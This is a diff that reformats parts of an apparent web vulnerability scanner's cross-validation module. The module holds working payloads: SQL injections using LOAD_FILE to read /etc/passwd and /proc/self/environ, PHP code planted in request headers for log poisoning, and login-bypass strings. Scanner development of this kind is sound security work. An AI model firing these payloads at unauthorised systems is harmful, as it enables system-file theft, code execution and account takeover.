@@ -11,8 +11,11 @@ def validate_sqli_with_lfi(url: str, param: str, sess, timeout: float = 10.0) ->
     result = {"vulnerable": False, "method": "sqli_lfi_cross", "confidence": 0.0, "evidence": []}
     lfi_paths = ["/etc/passwd", "/etc/issue", "/proc/self/environ"]
     for lfipath in lfi_paths:
-        for prefix in ["' UNION SELECT LOAD_FILE('%s')--", "' UNION SELECT LOAD_FILE('%s'),2,3--",
-                        "'||LOAD_FILE('%s')||'"]:
+        for prefix in [
+            "' UNION SELECT LOAD_FILE('%s')--",
+            "' UNION SELECT LOAD_FILE('%s'),2,3--",
+            "'||LOAD_FILE('%s')||'",
+        ]:
             payload = prefix % lfipath
             try:
                 r = sess.get(build_url(url, param, payload), timeout=timeout)
@@ -20,13 +23,25 @@ def validate_sqli_with_lfi(url: str, param: str, sess, timeout: float = 10.0) ->
                     if "root:" in r.text or "nobody:" in r.text:
                         result["vulnerable"] = True
                         result["confidence"] = 0.9
-                        result["evidence"].append({"method": "mysql_load_file", "file": lfipath, "preview": r.text[:100].strip()})
+                        result["evidence"].append(
+                            {
+                                "method": "mysql_load_file",
+                                "file": lfipath,
+                                "preview": r.text[:100].strip(),
+                            }
+                        )
                         result["dbms"] = "mysql"
                         return result
                     if "[fonts]" in r.text:
                         result["vulnerable"] = True
                         result["confidence"] = 0.85
-                        result["evidence"].append({"method": "mysql_load_file_win", "file": lfipath, "preview": r.text[:100].strip()})
+                        result["evidence"].append(
+                            {
+                                "method": "mysql_load_file_win",
+                                "file": lfipath,
+                                "preview": r.text[:100].strip(),
+                            }
+                        )
                         result["dbms"] = "mysql"
                         return result
             except Exception:
@@ -50,7 +65,9 @@ def validate_ssrf_with_lfi(url: str, param: str, sess, timeout: float = 10.0) ->
                 if "root:" in r.text or "[fonts]" in r.text or "PATH=" in r.text:
                     result["vulnerable"] = True
                     result["confidence"] = 0.85
-                    result["evidence"].append({"type": "file_read", "url": file_url, "preview": r.text[:150].strip()})
+                    result["evidence"].append(
+                        {"type": "file_read", "url": file_url, "preview": r.text[:150].strip()}
+                    )
                     break
         except Exception:
             continue
@@ -58,12 +75,22 @@ def validate_ssrf_with_lfi(url: str, param: str, sess, timeout: float = 10.0) ->
 
 
 def validate_lfi_with_log_poison(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
-    result = {"vulnerable": False, "method": "lfi_log_poison_cross", "confidence": 0.0, "evidence": []}
+    result = {
+        "vulnerable": False,
+        "method": "lfi_log_poison_cross",
+        "confidence": 0.0,
+        "evidence": [],
+    }
     marker = "CROSSVAL_%d" % int(time.time())
     try:
-        sess.get(url, headers={"User-Agent": "<?php echo '%s';?>" % marker,
-                                 "Referer": "<?php echo '%s';?>" % marker},
-                 timeout=timeout)
+        sess.get(
+            url,
+            headers={
+                "User-Agent": "<?php echo '%s';?>" % marker,
+                "Referer": "<?php echo '%s';?>" % marker,
+            },
+            timeout=timeout,
+        )
     except Exception:
         pass
     log_paths = [
@@ -79,7 +106,9 @@ def validate_lfi_with_log_poison(url: str, param: str, sess, timeout: float = 10
             if r.status_code == 200 and marker in r.text:
                 result["vulnerable"] = True
                 result["confidence"] = 0.95
-                result["evidence"].append({"method": "log_poison", "log_path": log_path, "marker_found": marker})
+                result["evidence"].append(
+                    {"method": "log_poison", "log_path": log_path, "marker_found": marker}
+                )
                 result["rce_available"] = True
                 return result
         except Exception:
@@ -115,7 +144,13 @@ def validate_sqli_with_second_order(url: str, param: str, sess, timeout: float =
             if marker in r.text:
                 result["vulnerable"] = True
                 result["confidence"] = 0.9
-                result["evidence"].append({"method": "second_order_injection", "confirm_url": confirm_url, "marker": marker})
+                result["evidence"].append(
+                    {
+                        "method": "second_order_injection",
+                        "confirm_url": confirm_url,
+                        "marker": marker,
+                    }
+                )
                 return result
         except Exception:
             continue
@@ -127,7 +162,7 @@ def validate_auth_with_sqli(url: str, param: str, sess, timeout: float = 10.0) -
     bypass_payloads = [
         "' OR '1'='1' --",
         "' OR 1=1 --",
-        "\" OR \"1\"=\"1\" --",
+        '" OR "1"="1" --',
         "admin' --",
         "admin' #",
         "' OR 1=1 LIMIT 1 --",
@@ -141,15 +176,16 @@ def validate_auth_with_sqli(url: str, param: str, sess, timeout: float = 10.0) -
                 if not has_login and len(r.text) > 100:
                     result["vulnerable"] = True
                     result["confidence"] = 0.75
-                    result["evidence"].append({"payload": payload[:40], "status": r.status_code, "size": len(r.text)})
+                    result["evidence"].append(
+                        {"payload": payload[:40], "status": r.status_code, "size": len(r.text)}
+                    )
                     break
         except Exception:
             continue
     return result
 
 
-def run_cross_validation(vtype: str, url: str, param: str, sess,
-                          timeout: float = 10.0) -> Dict:
+def run_cross_validation(vtype: str, url: str, param: str, sess, timeout: float = 10.0) -> Dict:
     results = {}
     if vtype == "sqli":
         lfi_r = validate_sqli_with_lfi(url, param, sess, timeout)
@@ -173,6 +209,10 @@ def run_cross_validation(vtype: str, url: str, param: str, sess,
 
     if results:
         combined_confidence = max(r.get("confidence", 0) for r in results.values())
-        return {"vulnerable": True, "confidence": combined_confidence,
-                 "method": "cross_validation", "cross_checks": results}
+        return {
+            "vulnerable": True,
+            "confidence": combined_confidence,
+            "method": "cross_validation",
+            "cross_checks": results,
+        }
     return {"vulnerable": False, "confidence": 0.0, "method": "cross_validation"}
